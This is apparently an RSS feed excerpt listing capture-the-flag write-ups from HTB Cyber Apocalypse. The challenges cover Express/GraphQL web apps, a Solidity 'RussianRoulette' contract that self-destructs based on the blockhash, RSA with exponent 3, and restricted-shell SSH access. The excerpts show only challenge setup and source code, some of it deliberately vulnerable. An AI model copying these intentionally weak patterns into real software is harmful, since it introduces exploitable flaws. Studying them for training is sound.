&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'/graphql'&lt;/span>&lt;span class="mtk1">, AuthMiddleware, &lt;/span>&lt;span class="mtk8">graphqlHTTP&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">schema&lt;/span>&lt;span class="mtk1">: GraphqlSchema,&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">graphiql&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk6">false&lt;/span>
&lt;span class="mtk1">}));&lt;/span>

&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">get&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'/dashboard'&lt;/span>&lt;span class="mtk1">, AuthMiddleware, &lt;/span>&lt;span class="mtk5">async&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">next&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">render&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'dashboard.html'&lt;/span>&lt;span class="mtk1">, {&lt;/span>&lt;span class="mtk1">user&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">.user});&lt;/span>
&lt;span class="mtk1">});&lt;/span>

&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">get&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'/logout'&lt;/span>&lt;span class="mtk1">, (&lt;/span>&lt;span class="mtk9 mtki">req&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">clearCookie&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'session'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">res&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">redirect&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'/'&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">});&lt;/span>

&lt;span class="mtk7 mtki">module&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk7 mtki">exports&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> () &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">router&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>It is very interesting that it uses GraphQL to manage the interaction with the database.&lt;/p></description></item><item><title>Path of Survival</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/path-of-survival/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/path-of-survival/</guid><description>&lt;p>We are given the following website:&lt;/p>
&lt;p>&lt;img alt="Path of Survival 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Path-of-Survival-1.webp">&lt;/p>
&lt;p>It shows a kind of labyrinth where we are an astronaut and we need to find a weapon in the shortest time possible.&lt;/p>
&lt;p>The website shows how to interact with our astronaut player, and shows some rules regarding labyrinth tiles (Cliff, Geyser, Mountain&amp;hellip;):&lt;/p>
&lt;p>&lt;img alt="Path of Survival 2" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Path-of-Survival-2.webp">&lt;/p>
&lt;p>&lt;img alt="Path of Survival 3" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Path-of-Survival-3.webp">&lt;/p>
&lt;p>&lt;img alt="Path of Survival 4" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Path-of-Survival-4.webp">&lt;/p>
&lt;p>Moreover, we have an HTTP API to get the map as a JSON document and to run commands to move the astronaut:&lt;/p></description></item><item><title>Percetron</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/percetron/</guid><description>&lt;p>We are given a website where we can register and log in to have this dashboard:&lt;/p>
&lt;p>&lt;img alt="Percetron 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202024/Percetron-1.webp">&lt;/p>
&lt;p>Moreover, we are given the whole web project for analysis.&lt;/p>
&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>The web server is running Express JS (Node.js). The &lt;code>index.js&lt;/code> file is quite standard, but we can see that it uses MongoDB and neo4j:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"dotenv"&lt;/span>&lt;span class="mtk1">).&lt;/span>&lt;span class="mtk8">config&lt;/span>&lt;span class="mtk1">();&lt;/span>

&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">path&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"path"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"express"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">session&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"express-session"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> mongoose &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"mongoose"&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Neo4jConnection&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"./util/neo4j"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">MongoDBConnection&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"./util/mongo"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> { migrate } &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"./util/generic"&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">genericRoutes&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"./routes/generic"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">panelRoutes&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">require&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"./routes/panel"&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">neo4j&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">new&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Neo4jConnection&lt;/span>&lt;span class="mtk1">();&lt;/span>
&lt;span class="mtk7 mtki">const&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">mongodb&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">new&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">MongoDBConnection&lt;/span>&lt;span class="mtk1">();&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"/static"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">static&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">path&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">join&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">__dirname&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"static"&lt;/span>&lt;span class="mtk1">)));&lt;/span> 

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urlencoded&lt;/span>&lt;span class="mtk1">({ &lt;/span>&lt;span class="mtk1">extended&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk6">true&lt;/span>&lt;span class="mtk1"> }));&lt;/span>
&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk8">express&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">json&lt;/span>&lt;span class="mtk1">());&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">session&lt;/span>&lt;span class="mtk1">({&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">secret&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk1">process&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">env&lt;/span>&lt;span class="mtk1">.SESSION_SECRET,&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">resave&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk6">true&lt;/span>&lt;span class="mtk1">,&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">saveUninitialized&lt;/span>&lt;span class="mtk1">: &lt;/span>&lt;span class="mtk6">true&lt;/span>&lt;span class="mtk1">,&lt;/span>
&lt;span class="mtk1"> })&lt;/span>
&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">set&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"view engine"&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"pug"&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">genericRoutes&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">use&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">panelRoutes&lt;/span>&lt;span class="mtk1">);&lt;/span>

&lt;span class="mtk7">setTimeout&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk5">async&lt;/span>&lt;span class="mtk1"> () &lt;/span>&lt;span class="mtk7 mtki">=&amp;gt;&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">await&lt;/span>&lt;span class="mtk1"> mongoose.&lt;/span>&lt;span class="mtk8">connect&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">process&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">env&lt;/span>&lt;span class="mtk1">.MONGODB_URL);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">await&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">migrate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">neo4j&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">mongodb&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">await&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">listen&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">3000&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">"0.0.0.0"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">console&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">log&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">"Listening on port 3000"&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;span class="mtk1">}, &lt;/span>&lt;span class="mtk6">10000&lt;/span>&lt;span class="mtk1">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>MongoDB is used for user authentication and authorization, using &lt;code>mongoose&lt;/code>. This is the only model we have:&lt;/p></description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/relic-maps/</guid><description>&lt;p>We have this description for the challenge:&lt;/p>
&lt;blockquote>
&lt;p>Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag. The link is to &lt;code>http://relicmaps.htb:/relicmaps.one&lt;/code>. The document is still live (relicmaps.htb should resolve to your docker instance).&lt;/p></description></item><item><title>Restricted</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/restricted/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/restricted/</guid><description>&lt;p>We are given a remote instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 64.227.41.83 30543
SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 

Invalid SSH identification string.


Ncat: Broken pipe.
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>It looks like we must access via SSH.&lt;/p>
&lt;h2 id="ssh-connection">SSH connection&lt;/h2>
&lt;p>We are also given some files:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">tree&lt;/span>
.
├── Dockerfile
├── build_docker.sh
└── src
 ├── bash_profile
 ├── flag.txt
 └── sshd_config

2 directories, 5 files 
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Loooking at the &lt;code>Dockerfile&lt;/code>, we see that the user is named &lt;code>restricted&lt;/code> and we will be using &lt;code>rbash&lt;/code> (restricted Bash):&lt;/p></description></item><item><title>Roten</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/roten/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/roten/</guid><description>&lt;p>We are given a PCAP file (&lt;code>challenge.pcap&lt;/code>) with a lot of network packets:&lt;/p>
&lt;p>&lt;img alt="Roten 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Roten-1.webp">&lt;/p>
&lt;h2 id="finding-the-attack-vector">Finding the attack vector&lt;/h2>
&lt;p>First of all, let&amp;rsquo;s filter by HTTP to read only high-level network packets:&lt;/p>
&lt;p>&lt;img alt="Roten 2" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Roten-2.webp">&lt;/p>
&lt;p>The attacker is poking around with the website. For instance, they are trying to use POST parameters:&lt;/p>
&lt;p>&lt;img alt="Roten 3" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Roten-3.webp">&lt;/p>
&lt;p>If we go to the end of the packet capture, we will see that the attackers are executing system commands:&lt;/p></description></item><item><title>Russian Roulette</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/russian-roulette/</guid><description>&lt;p>We are given a Solidity file called &lt;code>RussianRoulette.sol&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">pragma&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">solidity&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">0.8.23&lt;/span>&lt;span class="mtk1">;&lt;/span>

&lt;span class="mtk7 mtki">contract&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RussianRoulette&lt;/span>&lt;span class="mtk1"> {&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">constructor&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk7 mtki">payable&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk3">// i need more bullets&lt;/span>
&lt;span class="mtk1"> }&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">function&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pullTrigger&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk7 mtki">public&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">returns&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk7 mtki">string&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">memory&lt;/span>&lt;span class="mtk1">) {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> (&lt;/span>&lt;span class="mtk7 mtki">uint256&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9">blockhash&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9">block&lt;/span>&lt;span class="mtk1">.number &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">)) % &lt;/span>&lt;span class="mtk6">10&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">7&lt;/span>&lt;span class="mtk1">) {&lt;/span> 
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">selfdestruct&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">payable&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9">msg.sender&lt;/span>&lt;span class="mtk1">)); &lt;/span>&lt;span class="mtk3">// 💀&lt;/span>
&lt;span class="mtk1"> } &lt;/span>&lt;span class="mtk5">else&lt;/span>&lt;span class="mtk1"> {&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"im SAFU ... for now"&lt;/span>&lt;span class="mtk1">;&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1"> }&lt;/span>
&lt;span class="mtk1">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Moreover, we have this &lt;code>Setup.sol&lt;/code>, which is common in Solidity challenges:&lt;/p></description></item><item><title>Small StEps</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/small-steps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/small-steps/</guid><description>&lt;p>We are given a remote instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 188.166.152.84 32213
This is the second level of training. 

[E]ncrypt the flag.
[A]bort training.

&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We are also provided with the server&amp;rsquo;s Python source code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">number&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span>

&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">"HTB{???????????????}"&lt;/span>
&lt;span class="mtk5">assert&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">20&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">RSA&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">256&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">getPrime&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">256&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">n&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">q&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">p&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">e&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">3&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">plaintext&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">plaintext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">bytes_to_long&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">plaintext&lt;/span>&lt;span class="mtk1">)&lt;/span>
